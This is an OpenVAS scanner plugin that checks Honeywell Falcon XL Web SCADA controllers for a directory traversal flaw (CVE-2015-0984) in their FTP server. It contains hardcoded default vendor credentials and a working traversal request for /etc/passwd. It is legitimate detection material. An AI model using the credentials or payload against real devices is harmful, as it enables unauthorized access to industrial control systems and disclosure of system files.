###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_honeywell_xlweb_scada_dir_trav_vuln.nasl 9552 2018-04-20 12:17:18Z cfischer $
#
# Honeywell Falcon XL Web Controller Directory Traversal Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805540");
  script_version("$Revision: 9552 $");
  script_cve_id("CVE-2015-0984");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-20 14:17:18 +0200 (Fri, 20 Apr 2018) $");
  script_tag(name:"creation_date", value:"2015-04-27 10:42:16 +0530 (Mon, 27 Apr 2015)");
  script_name("Honeywell Falcon XL Web Controller Directory Traversal Vulnerability");

  script_tag(name: "summary" , value:"The host is installed with Honeywell Falcon
  XL Web Controller and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to read local file or not.");

  script_tag(name:"insight", value:"Flaw exists due to the FTP server not
  properly sanitizing user input, specifically path traversal style attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system.

  Impact Level: System/Application");

  script_tag(name:"affected", value:"
  XL1000C50-EXCEL WEB 52 I/O before 2.04.01
  XL1000C100-EXCEL WEB 104 I/O before 2.04.01
  XL1000C500-EXCEL WEB 300 I/O before 2.04.01
  XL1000C1000-EXCEL WEB 600 I/O before 2.04.01
  XL1000C50U-EXCEL WEB 52 I/O UUKL before 2.04.01
  XL1000C100U-EXCEL WEB 104 I/O UUKL before 2.04.01
  XL1000C500U-EXCEL WEB 300 I/O UUKL before 2.04.01
  XL1000C1000U-EXCEL WEB 600 I/O UUKL before 2.04.01");

  script_tag(name:"solution", value:"Upgrade to EXCEL WEB to version 2.04.01 or
  later. For updates refer to https://www.honeywellaidc.com/en-us/Pages/default.aspx");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2015/Apr/79");
  script_xref(name : "URL" , value : "https://ics-cert.us-cert.gov/advisories/ICSA-15-076-02");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp_banner/available");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if("xlweb FTP server" >!< banner){
  exit(0);
}

soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

user = get_kb_item("ftp/login");
if(!user){
  user = "xwadmin";
}

password = get_kb_item("ftp/password");
if(!password){
  password = string("kisrum1!");
}

login_details = ftp_log_in(socket:soc1, user:user, pass:password);

if(login_details)
{
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2)
  {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2)
    {
      attackreq = "RETR ../../../../../../../../etc/passwd";
      send(socket:soc1, data:string(attackreq, "\r\n"));
      attackres = ftp_recv_data(socket:soc2);
      if(attackres &&  attackres =~ "root:.*:0:[01]:" && "xwadmin" >< attackres)
      {
        security_message(port:ftpPort);
        ftp_close(socket:soc1);
        close(soc1);
        close(soc2);
        exit(0);
      }
      close(soc2);
    }
  }
  ftp_close(socket:soc1);
}
close(soc1);
